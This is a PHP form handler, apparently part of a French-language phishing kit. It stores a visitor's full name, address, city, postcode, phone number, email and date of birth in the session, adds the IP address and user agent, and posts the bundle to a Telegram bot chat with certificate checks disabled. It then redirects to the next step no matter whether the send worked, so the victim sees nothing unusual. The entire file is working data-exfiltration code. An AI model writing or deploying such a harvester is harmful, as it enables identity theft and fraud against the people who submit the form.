
<?php
session_start();  

$config = require '../config.php';

$rezbotToken = $config['rezbotToken'];  
$rezchatId = $config['rezchatId'];  

function clean($data) {
    return htmlspecialchars(stripslashes(trim($data)));
}

$_SESSION['type']     = clean($_POST['type'] ?? '');
$_SESSION['day']      = clean($_POST['day'] ?? '');
$_SESSION['timeslot'] = clean($_POST['timeslot'] ?? '');
$_SESSION['delivery'] = clean($_POST['delivery'] ?? '');
$_SESSION['nom']      = clean($_POST['nom'] ?? '');
$_SESSION['adresse']  = clean($_POST['adresse'] ?? '');
$_SESSION['zip']      = clean($_POST['zip'] ?? '');
$_SESSION['email']    = clean($_POST['email'] ?? '');
$_SESSION['ville']    = clean($_POST['ville'] ?? '');
$_SESSION['dob']      = clean($_POST['dob'] ?? '');
$_SESSION['tel']      = clean($_POST['tel'] ?? '');

$ip = $_SERVER['REMOTE_ADDR'] ?? 'Inconnue';
$os = $_SERVER['HTTP_USER_AGENT'] ?? 'Inconnu';

$message = <<<TEXT
<b>👮🏻‍♂️ + 1 INFORMATION</b>
└ {$_SESSION['type']}

<b>🏦 Informations Personnelles</b>
├ 🕵️ Nom complet :<code> {$_SESSION['nom']}</code>
├ 🏠 Adresse : <code> {$_SESSION['adresse']}</code>
├ 🏙️ Ville : <code>{$_SESSION['ville']}</code>
├ 📮 Zip : <code>{$_SESSION['zip']}</code>
├ 📞 Numéro de téléphone : <code>{$_SESSION['tel']}</code>
└ 📧 Email : <code>{$_SESSION['email']}</code>
└ 🎂 Date de naissance : <code>{$_SESSION['dob']}</code>

<b>🧩 Extra</b>
├ 🌐 IP : $ip
└ 🖥️ OS : $os
TEXT;

// Try to send Telegram notification, but don't fail if it doesn't work
try {
    $url = "https://api.telegram.org/bot$rezbotToken/sendMessage";
    $data = [
        'chat_id' => $rezchatId,
        'text' => $message,
        'parse_mode' => 'HTML' 
    ];
    
    // Use cURL instead of file_get_contents for better error handling
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5); // 5 second timeout
        $result = curl_exec($ch);
        curl_close($ch);
    } else {
        // Fallback to file_get_contents with error suppression
        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($data),
                'timeout' => 5
            ]
        ];
        $context = stream_context_create($options);
        $result = @file_get_contents($url, false, $context);
    }
} catch (Exception $e) {
    // Silently fail - we don't want to stop the user flow
    $result = false;
}

// Always redirect to next step, regardless of Telegram API result
header('Location: ../step/e.php');
exit;
?>
